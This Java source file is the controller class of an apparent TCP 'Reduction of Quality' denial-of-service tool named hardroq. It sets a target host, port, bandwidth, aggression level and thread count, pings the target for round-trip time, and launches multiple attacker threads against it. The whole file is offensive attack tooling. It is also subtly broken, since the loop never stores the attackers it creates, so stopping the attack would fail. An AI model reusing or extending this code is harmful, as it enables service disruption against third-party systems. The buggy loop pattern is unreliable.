package hardroq.controllers;

import java.io.IOException;

import hardroq.networking.Ping;
import hardroq.networking.TCPRoQ;

public class AttackController {
	//Singleton Crap
	private static AttackController _instance = new AttackController();
	private AttackController() {}
	
	public static AttackController getInstance() {
		return _instance;
	}
	
	//Internals
	private TCPRoQ[] attackers;
	private String host;
	private int port;
	private int RTT;
	private String attackHeader = "";
	private String attackFooter = "";
	private float aggressionIndex;
	private float bandwidth;
	private int numThreads;
	
	public void Attack() {
		//First, let's get a round trip time to initiate our attack vectors
		try {
			RTT = Ping.HTTPPing(host, port);
		} catch (IOException e) {
			System.out.println(e.getMessage());
		}
		
		attackers = new TCPRoQ[numThreads];
		for (TCPRoQ a : attackers) {
			a = new TCPRoQ.Builder().host(host).port(port)
					.bandwidth(bandwidth / numThreads).header(attackHeader)
					.footer(attackFooter).aggression(aggressionIndex)
					.RTT(RTT).build();
			a.InitiateAttack();
		}
	}
	
	public void EndAttack() {
		for (TCPRoQ a : attackers)
			a.EndAttack();
	}
	
	public void setAttackHeader(final String h) {
		attackHeader = h;
	}
	
	public void setAttackFooter(final String f) {
		attackFooter = f;
	}
	
	public void setAggressionIndex(final int a) {
		final float ai = a / 100.0f;
		aggressionIndex = ai;
	}
	
	public void setBandwidth(final float b) {
		bandwidth = b;
	}
	
	public void setTarget(final String t) {
		//if this is some sort of protocol, we should parse it
		host = t;
	}
	
	public void setPort(final int p) {
		port = p;
	}
	
	public void setNumThreads(final int t) {
		numThreads = t;
	}
}
